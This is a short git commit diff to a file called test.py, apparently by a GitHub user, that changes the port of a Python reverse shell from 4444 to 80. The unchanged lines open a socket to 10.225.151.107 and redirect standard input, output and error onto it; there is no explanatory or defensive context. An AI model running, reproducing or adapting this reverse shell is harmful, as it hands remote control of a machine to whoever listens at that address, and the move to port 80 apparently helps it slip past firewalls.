8bde95c704a9b181b4529e95c0d2ef88ba898dc5
vegarddale <69875804+vegarddale@users.noreply.github.com>
2023-03-13 15:12:11 +0100

    Update test.py

--- test.py
+++ test.py
@@ -1,6 +1,6 @@
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("10.225.151.107",4444))
+s.connect(("10.225.151.107",80))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
